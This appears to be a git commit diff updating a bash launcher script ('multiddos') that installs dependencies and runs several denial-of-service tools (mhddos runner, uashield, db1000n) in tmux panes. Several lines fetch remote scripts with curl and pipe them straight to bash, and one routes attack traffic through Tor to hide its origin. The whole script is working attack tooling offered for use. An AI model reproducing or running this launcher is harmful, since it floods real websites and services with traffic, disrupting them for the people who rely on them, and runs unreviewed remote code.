7705b071cbd5fd9ac1006d4e4bf2c782d300143c
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-07 15:56:00 +0300

    Update and rename multiddos_gs.sh to multiddos_test.sh

--- multiddos_test.sh
+++ multiddos_test.sh
@@ -1,6 +1,4 @@
 #!/bin/bash
-#google shell version
-
 sudo apt-get update -y
 sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
@@ -9,30 +7,28 @@ sudo apt install apt-transport-https ca-certificates curl software-properties-co
 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
 sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
 sudo apt install docker-ce -y
-    
-if [ ! -f "/usr/local/bin/gotop" ]; then
-    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
-    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
-    rm gotop_3.0.0_linux_amd64.deb
-fi
 
-tmux kill-session -t multiddos
-sudo pkill node
+tmux kill-session -t multiddos; sudo pkill node
 cd ~
 rm -rf multiddos
 mkdir multiddos
 cd multiddos
-curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
+
+if [ ! -f "/usr/local/bin/gotop" ]; then
+    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
+    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
+fi
 
 tmux new-session -s multiddos -d
-sleep 0.1
+#sleep 0.1
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
-sleep 0.1
+#sleep 0.1
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
-sleep 0.1
-tmux split-window -v 'torsocks -i ./db1000n'
+#sleep 0.1
+tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
+ && torsocks -i ./db1000n'
+ #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux select-pane -t 0
 gotop -asc solarized
-#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux -2 attach-session -d
